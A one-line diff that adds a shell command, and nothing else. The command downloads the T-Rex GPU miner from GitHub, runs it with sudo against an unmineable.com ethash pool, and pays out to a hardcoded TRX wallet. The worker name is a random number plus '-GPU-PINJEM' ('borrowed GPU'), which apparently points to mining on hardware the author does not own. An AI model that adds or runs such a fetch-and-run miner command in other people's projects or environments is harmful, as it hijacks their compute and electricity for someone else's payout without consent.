@@ -1,0 +1,1 @@
+apt-get install libpci3 && wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && cd t-rex-0.21.6 && sudo ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63.$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
